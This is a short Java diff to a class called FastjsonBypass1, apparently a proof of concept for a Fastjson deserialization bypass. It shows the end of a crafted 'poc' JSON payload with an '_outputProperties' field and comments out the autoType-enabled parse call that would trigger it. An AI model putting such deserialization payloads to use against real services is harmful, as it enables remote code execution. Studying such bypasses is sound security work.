@@ -24,8 +24,8 @@ public class FastjsonBypass1 {
                 "\"_outputProperties\":{}" +
                 "}";
         System.out.println(poc);
-        ParserConfig config = new ParserConfig();
-        config.setAutoTypeSupport(true);
-        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
+//        ParserConfig config = new ParserConfig();
+//        config.setAutoTypeSupport(true);
+//        Object obj = JSON.parseObject(poc, Object.class, config, Feature.SupportNonPublicField);
     }
 }
